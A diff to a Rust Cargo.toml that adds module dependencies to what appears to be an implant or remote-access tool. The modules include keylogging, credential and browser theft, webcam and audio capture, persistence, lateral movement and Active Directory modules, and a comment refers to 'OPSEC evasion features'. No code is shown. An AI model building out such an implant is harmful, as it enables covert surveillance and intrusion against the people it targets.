@@ -75,6 +75,54 @@ path = "../implant-modules/mod-socks"
 [dependencies.mod-screenshot]
 path = "../implant-modules/mod-screenshot"
 
+[dependencies.mod-env]
+path = "../implant-modules/mod-env"
+
+[dependencies.mod-keylog]
+path = "../implant-modules/mod-keylog"
+
+[dependencies.mod-clipboard]
+path = "../implant-modules/mod-clipboard"
+
+[dependencies.mod-reg]
+path = "../implant-modules/mod-reg"
+
+[dependencies.mod-svc]
+path = "../implant-modules/mod-svc"
+
+[dependencies.mod-persist]
+path = "../implant-modules/mod-persist"
+
+[dependencies.mod-scan]
+path = "../implant-modules/mod-scan"
+
+[dependencies.mod-lateral]
+path = "../implant-modules/mod-lateral"
+
+[dependencies.mod-creds]
+path = "../implant-modules/mod-creds"
+
+[dependencies.mod-browser]
+path = "../implant-modules/mod-browser"
+
+[dependencies.mod-audio]
+path = "../implant-modules/mod-audio"
+
+[dependencies.mod-webcam]
+path = "../implant-modules/mod-webcam"
+
+[dependencies.mod-usb]
+path = "../implant-modules/mod-usb"
+
+[dependencies.mod-rdp]
+path = "../implant-modules/mod-rdp"
+
+[dependencies.mod-proc]
+path = "../implant-modules/mod-proc"
+
+[dependencies.mod-ad]
+path = "../implant-modules/mod-ad"
+
 [features]
 default = []
 # Phase 4 OPSEC evasion features
